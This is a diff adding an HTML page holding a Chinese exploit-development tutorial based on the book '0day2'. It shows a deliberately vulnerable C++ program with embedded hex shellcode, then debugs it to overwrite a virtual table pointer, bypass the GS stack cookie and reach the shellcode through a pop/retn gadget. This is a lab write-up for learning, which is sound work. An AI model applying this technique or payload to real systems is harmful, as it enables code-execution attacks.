@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>10.3Overrun virtual_func table</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="overrun-virtual_func-table">Overrun virtual_func table</h1>
+<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com</strong></p>
+<p>这篇会写的很详细，因为我觉得调试这节有一种最开始学习二进制的感觉，刺激！！！！！！</p>
+<p>《0day2》提供的代码是这样的</p>
+<p><img src="Image/1.png" alt=""></p>
+<p>我们观察一下，然后给下个断点</p>
+<pre><code>// over_virtual.cpp : 定义控制台应用程序的入口点
+//
+
+#include &quot;stdafx.h&quot;
+#include &quot;string.h&quot;
+
+class GSVirtual {
+    public:
+        void gsv(char* src)
+        {
+            char buf[200];
+            strcpy(buf, src);
+            bar(); // virtual function call
+        }
+        virtual void  bar()
+        {}
+};
+
+int main()
+{
+    GSVirtual test;
+    __asm int 3
+    test.gsv(
+        &quot;\x04\x2b\x99\x7C&quot;
+        &quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;
+        &quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;
+        &quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;
+        &quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;
+        &quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;
+        &quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;
+        &quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;
+        &quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;
+        &quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;
+        &quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;
+        &quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+        &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+    );
+    return 0;
+}
+</code></pre><p>VS的配置按照第一篇的配置就行了，然后生成后咱们在虚拟机里面运行，断下附加OD</p>
+<p><img src="Image/2.png" alt=""></p>
+<p>可以看到，push操作是把字符串的指针压栈，在数据区跟随一下可以看出来，我们单步走，遇到下面那个call跟进去</p>
+<p><img src="Image/3.png" alt=""></p>
+<p>我们跟进来后可以看到生成Security Cookie的代码段，然后往下找可以看到校验Security Cookie的代码段</p>
+<p><img src="Image/4.png" alt=""></p>
+<p>好了看完了Security Cookie部分，咱们来看看执行虚函数的部分，我们从代码可以看出来，执行了strcpy之后，就是执行虚函数，所以我们来看看执行虚函数的代码段</p>
+<p><img src="Image/5.png" alt=""></p>
+<p>关于利用虚函数我在第六章有调试过，但是我返回去看了看，好像写的不太好，细节没有写的很详细，所以看起来会有一些费劲，那么在这里就详细的记录一下</p>
+<p>我们先把这个放下，找到第六章调试虚函数的代码，用VC编译就行了，同样在调用前下断点，然后附加上OD，注意观察寄存器的值</p>
+<p><img src="Image/6.png" alt=""></p>
+<p>F8走</p>
+<p><img src="Image/7.png" alt=""></p>
+<p>是不是没有看懂？</p>
+<p>不急我们重新梳理一遍，来看一下代码，我们先不调试溢出什么的，我们就看虚函数是如何调用的？以及虚表指针到底放在哪里？</p>
+<p>下面是我们要用到的代码，可以看到我把修改虚表指针的代码注释掉了，因为我们要是修改了虚表指针那么在调试的时候就会跳到shellcode</p>
+<p>这里补充一下：</p>
+<p><a href="https://github.com/jayzeng/The-Art-Of-Programming-by-July/blob/master/ebook/zh/08.0.md" target="_blank">从头至尾漫谈虚函数</a></p>
+<p><img src="Image/8.png" alt=""></p>
+<p>OD附加上，来到虚函数指针的地址指向的地方，可以看到<code>0x004080C8</code>是虚表指针</p>
+<p><img src="Image/9.png" alt=""></p>
+<p>然后我们跟着走</p>
+<p><img src="Image/10.png" alt=""></p>
+<p>先把虚表指针的地址赋值给ECX，在数据区标注的地方就是虚表指针的地址</p>
+<p>接着单步走</p>
+<p><img src="Image/11.png" alt=""></p>
+<p>把虚表指针传给EAX，此时EAX存的是虚表指针<code>0x004080C8</code>，也就是说，<code>0x004080C8</code>这个地址开始存的是虚函数的指针，继续单步走</p>
+<p><img src="Image/12.png" alt=""></p>
+<p>根据EAX处的值取出虚函数的地址<code>0x00401020</code>进行调用，这里是直接调用函数指针</p>
+<p><img src="Image/13.png" alt=""></p>
+<p>大概是明白了吧？</p>
+<p>我再来总结一下：先是获取虚表指针的地址，然后根据虚表指针的地址获取虚表指针，获取到虚表指针后再获取虚函数指针，最后调用虚函数指针就行了</p>
+<p>画个示意图</p>
+<p><img src="Image/14.png" alt=""></p>
+<p>继续解释：我们先获取某地址，这个地址存的是虚表指针的地址，我们可以看到这次虚表指针的地址是<code>0x0040BAA8</code>，然后我们根据虚表指针的地址去获取虚表指针，可以看到虚表指针是<code>0x004080C8</code>，然后根据虚表指针来找虚函数指针，虚函数指针是<code>0x00401020</code></p>
+<p>然后我们来看看最开始被我们丢在一边的程序 </p>
+<p>我们重新载入给个特写</p>
+<p><img src="Image/15.png" alt=""></p>
+<p>按照我们刚才的分析，把代码段复制下来解释一下</p>
+<pre><code>004012DD    8B85 24FFFFFF   mov     eax, dword ptr [ebp-DC];获取虚表指针的地址
+004012E3    8B10            mov     edx, dword ptr [eax];获取虚表指针
+004012E5    8B8D 24FFFFFF   mov     ecx, dword ptr [ebp-DC]
+004012EB    8B02            mov     eax, dword ptr [edx];获取虚函数指针
+004012ED    FFD0            call    eax;调用虚函数
+</code></pre><p>那我们就走下来看看虚表指针在哪里</p>
+<p>哎呀！！！！！！忘了这是溢出的代码了，不过没关系，不影响前面的分析，我们来修改一下代码先不要溢出，随意减小长度就行了，重新运行到这，可以看到此时的虚表指针是<code>0x00411A4C</code></p>
+<p><img src="Image/16.png" alt=""></p>
+<p>继续跟着走，找到虚函数指针，看寄存器EAX的值</p>
+<p><img src="Image/17.png" alt=""></p>
+<p>虚函数指针是<code>0x00401300</code>，我们跳过去看看，这就是虚函数代码段</p>
+<p><img src="Image/18.png" alt=""></p>
+<p>现在是完全的分析了一遍如何找到虚表指针的过程，以及各种细节，如果你还不是很懂，在纸上画一画就好了</p>
+<p>我们来额外补充一点东西，我们写两个虚函数</p>
+<p><img src="Image/19.png" alt=""></p>
+<p>可以在OD里面看到，这里是两处的虚函数调用</p>
+<p><img src="Image/20.png" alt=""></p>
+<p>具体分析一下</p>
+<pre><code>004012DD    8B85 28FFFFFF   mov     eax, dword ptr [ebp-D8];获取虚表指针的地址
+004012E3    8B10            mov     edx, dword ptr [eax];获取虚表指针
+004012E5    8B8D 28FFFFFF   mov     ecx, dword ptr [ebp-D8]
+004012EB    8B02            mov     eax, dword ptr [edx];获取虚函数的地址
+004012ED    FFD0            call    eax;调用第一个虚函数
+004012EF    8B8D 28FFFFFF   mov     ecx, dword ptr [ebp-D8]; 获取虚表指针的地址
+004012F5    8B11            mov     edx, dword ptr [ecx]; 获取虚表指针
+004012F7    8B8D 28FFFFFF   mov     ecx, dword ptr [ebp-D8];
+004012FD    8B42 04         mov     eax, dword ptr [edx+4];获取虚函数的地址
+00401300    FFD0            call    eax调用第二个虚函数
+</code></pre><p>好了补充完了，现在开始分析如何通过覆盖虚函数的方法来突破GS</p>
+<p>标注的地方很熟悉了</p>
+<p><img src="Image/21.png" alt=""></p>
+<p>走完这一段，我们来观察一下栈的布局</p>
+<pre><code>0012FF5C   C09D019E  ?澙
+0012FF60  /0012FF74  t.
+0012FF64  |00401356  V@.  返回到 over_vir.00401356 来自 over_vir.00401260
+0012FF68  |00411A38  8A.  ASCII &quot;Hello World!&quot;
+0012FF6C  |00411A4C  LA.  over_vir.00411A4C
+0012FF70  |C09D018A  ?澙
+0012FF74  ]0012FFC0  ?
+</code></pre><p>看的出来Security Cookie吧？</p>
+<p>然后，看到了虚表指针了吗？<code>0x0012FF6C</code>是虚表指针的地址</p>
+<p>那么我们攻击的思路就是，先覆盖虚表指针，因为我们是在函数里面调用虚函数，所以并不会因为retn而进行Cookie校验</p>
+<p>那我们就开始来定位缓冲区的起始位置，直接走完strcpy的代码段，这里我没有进行优化所以有点太直观啦ヾ(≧O≦)〃嗷~</p>
+<p><img src="Image/22.png" alt=""></p>
+<p>算出中间的间隔大小后，我们来填充看看</p>
+<p><img src="Image/23.png" alt=""></p>
+<p>精准覆盖！！！！！！</p>
+<p>好了现在把栈的布局搞清楚了，我们重新修改一下代码，将我们加上的一个虚函数去掉</p>
+<p>顺便带上《0day2》里的shellcode，注意这里我们还没有确定各种地址，先来看看具体的情况，然后再根据系统来修改</p>
+<p><img src="Image/24.png" alt=""></p>
+<p>这时候我们会遇到一个问题，我们执行虚函数会call eax，执行了之后我们是回不到shellcode的，怎么办？</p>
+<p>那我们就来梳理一下我们利用的思路：首先我们溢出，覆盖掉虚表指针，然后执行虚函数，这时候先取出虚表指针，到虚表指针指向的地方取出虚函数指针，也就是说，我们直接覆盖的虚表指针那个位置存的是shellcode起始地址，这里要理解！！！！！！</p>
+<p>《0day2》里面说实话我是没有看懂，自己捣鼓了很久，好了假设你已经看懂了上面的，放心吧后面还会详细解释的ヾ(^▽^*)))</p>
+<p><img src="Image/25.png" alt=""></p>
+<p>看，标注出来的是虚表指针<code>0x00411A38</code>，当然这是我已经找好的，在你的电脑上还需要手动确定一下</p>
+<p>然后我们call的时候会执行<code>0x7C992B11</code>，这个是怎么确定的呢？</p>
+<p>这就需要来观察一下栈了</p>
+<p><img src="Image/26.png" alt=""></p>
+<p>这是现在的栈顶，可以看到栈顶刚好是我们shellcode的起始地址，然后我们执行call的时候，会压入一个返回地址，也就是说，我们只要执行一个pop和retn，就可以跳到shellcode</p>
+<p>我们F7单步走一下看看，这里我已经找好pop和retn了，所以直接能演示</p>
+<p><img src="Image/27.png" alt=""></p>
+<p>看，我们在进入这个call的时候，堆栈压入了一个返回地址，按照上面的代码，一个pop把返回地址弹掉，然后retn到<code>0x0012FE94</code>，这个位置刚好是shellcode的起始位置，也就是说我们成功跳到了shellcode的空间了<br>来看看具体代码</p>
+<p><img src="Image/28.png" alt=""></p>
+<p>《0day2》里面是通过结束符来修改最后两位，但是我这里的情况修改最后两位是不能实现的，所以具体情况还是要根据你的电脑进行修改</p>
+<p>最后的效果</p>
+<p><img src="Image/29.png" alt=""></p>
+<p>欢迎交流╭( ･ㅂ･)و</p>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
